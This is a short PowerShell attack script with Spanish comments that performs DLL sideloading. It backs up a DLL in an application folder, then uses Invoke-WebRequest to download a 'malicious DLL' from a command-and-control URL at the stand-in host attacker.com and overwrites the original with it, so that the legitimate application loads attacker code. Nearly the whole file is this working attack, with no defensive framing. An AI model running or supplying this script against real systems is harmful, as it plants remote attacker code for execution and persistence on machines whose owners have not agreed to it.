# DLL Sideloading - Reemplazo directo
param(
    [string]$C2Url = "https://attacker.com/malicious.dll",
    [string]$TargetPath = "C:\Program Files\VulnerableApp\original.dll",
    [string]$BackupPath = "C:\Program Files\VulnerableApp\original.dll.backup"
)

Write-Host "[+] Iniciando reemplazo de DLL" -ForegroundColor Yellow

# Paso 1: Hacer backup de la DLL original
Write-Host "[1] Haciendo backup de la DLL original..." -ForegroundColor Cyan
if (Test-Path $TargetPath) {
    Copy-Item -Path $TargetPath -Destination $BackupPath -Force
    Write-Host "[+] Backup creado: $BackupPath" -ForegroundColor Green
} else {
    Write-Host "[-] DLL original no encontrada: $TargetPath" -ForegroundColor Red
    exit 1
}

# Paso 2: Descargar DLL maliciosa
Write-Host "[2] Descargando DLL maliciosa..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $C2Url -OutFile $TargetPath
    Write-Host "[+] DLL descargada y colocada en: $TargetPath" -ForegroundColor Green
}
catch {
    Write-Host "[-] Error descargando DLL: $_" -ForegroundColor Red
    exit 1
}

# Paso 3: Verificar reemplazo
Write-Host "[3] Verificando reemplazo..." -ForegroundColor Cyan
if (Test-Path $TargetPath) {
    $fileInfo = Get-Item $TargetPath
    Write-Host "[+] Reemplazo exitoso - DLL lista para sideloading" -ForegroundColor Green
    Write-Host "[+] Tamaño: $($fileInfo.Length) bytes" -ForegroundColor White
    Write-Host "[+] Ubicacion: $TargetPath" -ForegroundColor White
} else {
    Write-Host "[-] Error: DLL no encontrada despues del reemplazo" -ForegroundColor Red
}

Write-Host "[+] Proceso completado" -ForegroundColor Green